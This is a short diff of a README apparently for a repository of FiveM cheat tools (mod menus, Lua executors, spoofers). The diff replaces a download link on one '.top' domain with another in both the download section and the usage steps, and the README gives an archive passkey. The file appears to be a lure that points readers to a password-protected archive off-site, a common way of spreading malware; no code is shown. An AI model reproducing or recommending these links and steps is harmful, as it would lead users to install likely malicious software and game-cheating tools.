@@ -9,7 +9,7 @@ A collection of open-source FiveM tools — mod menus, Lua executors, spoofers, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -85,7 +85,7 @@ These tools are intended for research and educational purposes only.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 
 2. Extract the archive.
 
